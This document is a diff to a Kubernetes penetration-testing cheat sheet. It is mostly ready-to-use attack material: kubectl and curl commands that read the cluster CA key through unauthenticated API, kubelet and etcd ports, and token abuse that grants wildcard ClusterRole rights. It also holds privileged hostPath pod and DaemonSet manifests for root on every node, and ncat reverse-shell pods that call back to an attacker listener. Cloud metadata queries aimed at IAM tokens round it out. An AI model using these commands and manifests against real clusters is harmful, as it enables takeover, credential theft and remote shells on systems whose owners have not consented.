@@ -1,10 +1,71 @@
-testing creds usually come as .kube/config file
-	look for in dev systems post-exploitation
+What can I do currently?
+	kubectl can-i --list
+
+
+Look for Cluster CA key
+	/etc/kubernetes/pki/ca.key
+	see https://raesene.github.io/blog/2019/04/16/kubernetes-certificate-auth-golden-key/
+
+
+Insecure Port
+	kubectl -s http://<node_IP>:8080 -n kube-system get pods
+	kubectl -s http://<node_IP>:8080 -n kube-system exec -it kube-apiserver-<cluster_name>-control-plane /bin/sh
+	cat /etc/kubernetes/pki/ca.key
+
+Secure Port (no authentication)
+	kubectl --insecure-skip-tls-verify --username=system:unauthenticated -s https://<target_IP>:<secure_port_eg_6443> get po -n kube-system
+
+	kubectl --insecure-skip-tls-verify --username=system:unauthenticated -s https://<target_IP>:<secure_port_eg_6443> -n kube-system exec kube-apiserver-<cluster_name>-control-plane -- cat /etc/kubernetes/pki/ca.key
+
+Kubelet API (no authentication)
+	curl https://172.18.0.4:10250/pods -k | jq | grep apiserver
+			
+	curl -X POST https://172.18.0.4:10250/run/kube-system/kube-apiserver-<cluster_name>-control-plane/kube-apiserver -k -d "cmd=cat /etc/kubernetes/pki/ca.key"
+
+etcd (no authentication)
+	kubectl --insecure-skip-tls-verify -s https://<target_IP>:6443 --token="<JWT_token>" -n kube-system get pods
+	kubectl --insecure-skip-tls-verify -s https://<target_IP>:6443 --token="<JWT_token>" -n kube-system exec -it kube-apiserver-<cluster_name>-control-plane /bin/sh
+
+	cat /etc/kubernetes/pki/ca.key
+
+Kubernetes Dashboard (no authentication)
+	kubectl --token="<JWT_token>" -s https://<target_IP>:6443 --insecure-skip-tls-verify -n kube-system exec kube-apiserver-<cluster_name>-control-plane cat /etc/kubernetes/pki/ca.key
+
+Access to cluserrole-aggregation-controller-token-... secret
+		kubectl -n kube-system get secret clusterrole-aggregation-controller-token-... -o json
+
+		get "token" field from secret and b64 decode it to get JWT token
+
+		assign JWT to variable for ease of use
+			TOKEN='<decoded_JWT_token'
+
+		kubectl --token=$TOKEN get clusterroles
+
+		kubectl --token=$TOKEN edit clusterrole system:controller:clusterrole-aggregation-controller
+
+		Add wildcards to the following in the "rules" section
+
+			- apiGroups:
+		  - '*'
+		  resources:
+		  - '*'
+		  verbs:
+		  - '*'
+
+		kubectl --token=$TOKEN get pods
+
+		kubectl --token=$TOKEN -n kube-system exec kube-apiserver-sshgs-control-plane cat /etc/kubernetes/pki/ca.key
+
+
+
 
 Cloud Metadata Services
-	AWS/Azure - 169.254.169.254
-	GCP - metadata.google.internal
-	possible container breakout
+	AWS/Azure 
+		curl http://169.254.169.254/
+	GCP 
+		curl https://metadata.google.internal
+	
+	possible breakout
 		access to IAM tokens
 			not easy to block access from EC2 or K8s
 				K8s may be provided with excessive permissions to manage EC2 for autoscaling
@@ -18,130 +79,245 @@ Allowing pod creation leads to privesc through various routes
 
 Check for impersonation rights 
 
+Check .bash_history
+
+
 Compromised User Attacks
-	Root on node if you have pod creation rights and pod exec rights
-		noderoot.yml 
-			apiVersion: v1
-			kind: Pod
-			metadata: 
-			  name: noderootpod
-			  labels:
-			spec:
-			  hostNetwork: true
-			  hostPID: true
-			  hostIPC: true
-			  containers:
-			  - name: noderootpod
-			    image: busybox
-			    securityContext:
-			      privileged: true
-				volumeMounts:
-				- mountPath: /host
-				  name: noderoot
-				command: [ "/bin/sh", "-c", "--" ]
-				args: [ "while true; do sleep 30; done;" ]
-			  volumes:
-			  - name: noderoot
-			    hostPath:
-			      path: /
 
-		kubectl create -f /path/to/noderoot.yml
-		kubectl exec -it noderootpod chroot /host
+	CA key if you have a pod with pod exec rights - single node
+		kubectl -n kube-system get pods
+		kubectl -n kube-system exec kube-apiserver-<cluster_name>-control-plane cat /etc/kubernetes/pki/ca.key
 
-		and get cluster CA key
-			/etc/kubernetes/pki/ca.key
-
-	Root on all nodes (incl master nodes) in a cluster if you have create pod rights and pod exec rights
-		nodedeamon.yml
-			apiVersion: apps/v1
-			kind: DaemonSet
-			metadata:
-			  name: noderootpod
-			  labels:
-			spec:
-			  selector:
-			    matchLabels:
-			 	  name: noderootdaemon
-			  template:
-			    metadata:
-			 	  labels:
-			 	    name: noderootdaemon
-				spec:
-				  tolerations:
-				  - key: node-role.kubernetes.io/master
-				    effect: NoSchedule
-				  hostNetwork: true
-				  hostPID: true
-				  hostIPC: true
-				  containers:
-				  - name: noderootpod
-				    image: busybox
-				    securityContext:
-				      privileged: true
-					volumeMounts:
-					- mountPath: /host
-					  name: noderoot
-					command: [ "/bin/sh", "-c", "--" ]
-					args: [ "while true; do sleep 30; done;" ]
-				  volumes:
-				  - name: noderoot
-				    hostPath:
-				      path: /
-
-		kubectl create -f /path/to/nodedaemon.yml
-		kubectl exec -it noderootpod chroot /host
-
-
-	Root on node via hostPath if you have pod creation rights
+	
+	CA key if you have pod creation rights and pod exec rights - single node
 		Works on Master Nodes - mounts PKI directory in container to dump cluster CA key
-		key-dumper-pod.yml 
-			apiVersion: v1
-			kind: Pod
-			metadata: 
-			  name: key-dumper-pod
-			  labels:
-			spec:
-			  containers:
-			  - name: keydumper-pod
-			    image: busybox
-			    volumeMounts:
-			    - mountPath: /pki
-			      name: keyvolume
-			    command: ['cat', '/pki/ca.key']
-			  volumes:
-			  - name: keyvolume
-			    hostPath:
-			      path: /etc/kubernetes/pki
-			      type: directory
 
-		kubectl create -f key-dumper-pod.yml
-		kubectl logs key-dumper-pod
+		vi key-dumper-pod.yml
 
-	Root on node via reverse shell if you have pod creation rights
-		start nc listener (ncat -nvlp <listener_port>)
+apiVersion: v1
+kind: Pod
+metadata: 
+  name: keydumper-pod
+  labels:
+    app: keydumper
+spec:
+  containers:
+  - name: keydumper-pod
+    image: busybox
+    volumeMounts:
+    - mountPath: /pki
+      name: keyvolume
+    command: [ "cat", "/pki/ca.key" ]
+  volumes:
+  - name: keyvolume
+    hostPath:
+      path: /etc/kubernetes/pki
+      type: Directory
 
-		ncat-reverse-shell-pod.yml 
-			apiVersion: v1
-			kind: Pod
-			metadata: 
-			  name: ncat-reverse-shell-pod
-			  labels:
-			spec:
-			  containers:
-			  - name: ncat-reverse-shell
-			    image: raesene/ncat
-			    volumeMounts:
-			    - mountPath: /host
-			      name: hostvolume
-			    command: ['<listener_IP>', '<listener_port>', '-e', '/bin/bash']
-			  volumes:
-			  - name: hostvolume
-			    hostPath:
-			      path: /
-			      type: directory
+		kubectl create -f ./key-dumper-pod.yml
+		kubectl logs -f keydumper-pod
+
+	CA key if you have pod creation rights and pod exec rights - multiple nodes
+
+		Get the control-plane node name
+			kubectl get nodes
+
+		vi keydumper-multi.yml
+
+apiVersion: v1
+kind: Pod
+metadata: 
+  name: keydumper-pod
+  labels:
+    app: keydumper
+spec:
+  containers:
+  - name: keydumper-pod
+    image: busybox
+    volumeMounts:
+    - mountPath: /pki
+      name: keyvolume
+    command: [ "cat", "/pki/ca.key" ]
+  volumes:
+  - name: keyvolume
+    hostPath:
+      path: /etc/kubernetes/pki
+      type: Directory
+  tolerations:
+  - key: node-role.kubernetes.io/master
+    effect: NoSchedule
+  nodeName: <cluster_name>-control-plane  
+
+		kubectl create -f ./keydumper-multi.yml
+		kubectl logs keydumper-pod
+
+
+	Root on node if you have pod creation rights and pod exec rights #1
+		kubectl run r00t --restart=Never -ti --rm --image h0nk --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1", "image":"alpine", "command":["nsenter", "--mount=/proc/1/ns/mnt", "--", "/bin/bash"], "stdin": true, "tty":true, "imagePullPolicy":"IfNotPresent", "securityContext":{"privileged":true}}]}}'
+
+		ctrl-C
+
+		kubectl exec -it r00t bash
+
+		cat /etc/kubernetes/pki/ca.key
+
+
+	Root on node if you have pod creation rights and pod exec rights #2
+	
+		vi noderoot.yml 
+
+apiVersion: v1
+kind: Pod
+metadata: 
+  name: noderootpod
+  labels:
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: noderootpod
+    image: busybox
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+
+		kubectl create -f ./noderoot.yml
+		kubectl exec -it noderootpod chroot /host
+
+		cat /etc/kubernetes/pki/ca.key
+
+
+	Root on node via reverse shell if you have pod creation rights but not exec rights
+		ifconfig
+
+		nc -nvlp <listener_port>
+
+		vi ncat-reverse-shell-pod.yml 
+
+apiVersion: v1
+kind: Pod
+metadata:
+  name: ncat-reverse-shell-pod
+spec:
+  containers:
+  - name: ncat-reverse-shell
+    image: raesene/ncat
+    volumeMounts:
+    - mountPath: /rooted
+      name: hostvolume
+    args: ['<listener_IP>', '<listener_port>', '-e', '/bin/bash']
+  volumes:
+  - name: hostvolume
+    hostPath:
+      path: /
+      type: Directory
 
 		kubectl create -f ncat-reverse-shell-pod.yml
 		
+		cat /rooted/etc/kubernetes/pki/ca.key
+
+
+	
+	Root on all nodes (incl master nodes) if you have create daemonset rights and pod exec rights
+
+		vi nodedeamon.yml
+
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: noderootpod
+  labels:
+spec:
+  selector:
+    matchLabels:
+      name: noderootdaemon
+  template:
+    metadata:
+      labels:
+        name: noderootdaemon
+    spec:
+      tolerations:
+      - key: node-role.kubernetes.io/master
+        effect: NoSchedule
+      hostNetwork: true
+      hostPID: true
+      hostIPC: true
+      containers:
+      - name: noderootpod
+        image: busybox
+        securityContext:
+          privileged: true
+        volumeMounts:
+        - mountPath: /host
+          name: noderoot
+        command: [ "/bin/sh", "-c", "--" ]
+        args: [ "while true; do sleep 30; done;" ]
+      volumes:
+      - name: noderoot
+        hostPath:
+          path: /
+
+		kubectl create -f ./nodedaemon.yml
+		kubectl exec -it noderootpod chroot /host
+
+
+	Root on node via reverse shell if you have daemonset creation rights but not pod exec rights
+		ifconfig
+
+		nc -nvlp <listener_port>
+
+		vi nodedaemon-rev.yml
+
+apiVersion: /api/apps/v1
+kind: DaemonSet
+metadata:
+  name: noderootpod-rev
+  labels:
+spec:
+  selector:
+    matchLabels:
+      name: noderootdaemon-rev
+  template:
+    metadata:
+      labels:
+        name: noderootdaemon-rev
+    spec:
+      tolerations:
+      - key: node-role.kubernetes.io/master
+        effect: NoSchedule
+      hostNetwork: true
+      hostPID: true
+      hostIPC: true
+      containers:
+      - name: ncat-reverse-shell
+        image: raesene/ncat
+        volumeMounts:
+        - mountPath: /rooted
+          name: hostvolume
+        args: ['<listener_IP>', '<listener_port>', '-e', '/bin/bash']
+      volumes:
+      - name: hostvolume
+        hostPath:
+          path: /
+          type: Directory
+
+		kubectl create -f nodedaemon-rev.yml
+
+		cat /rooted/etc/kubernetes/pki/ca.key
+
+
+
+		
+
 port-forwarding
 	get direct access to a pod's services from a local machine
 		portforward cluster services to the machine you run kubectl on
@@ -181,7 +357,7 @@ AWS K8s
 
 	Steal AWS tokens
 
-		spin up a pod in their network:
+		create a pod in their network:
 			kubectl run -it --image=smarticu5/container-review-admin ncc-test -- /bin/bash 
 
 		check for AWS permissions:
